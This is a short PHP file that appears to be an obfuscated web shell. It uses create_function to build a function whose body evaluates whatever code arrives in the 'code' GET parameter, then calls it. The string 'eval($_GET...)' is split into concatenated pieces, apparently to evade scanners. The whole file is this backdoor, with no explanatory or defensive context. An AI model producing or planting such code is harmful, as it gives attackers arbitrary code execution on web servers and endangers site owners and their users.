
<?php

    $function = create_function('$code','ev'.'al'.'($_'.'GET'.'["code"]);');

    $function();

?>
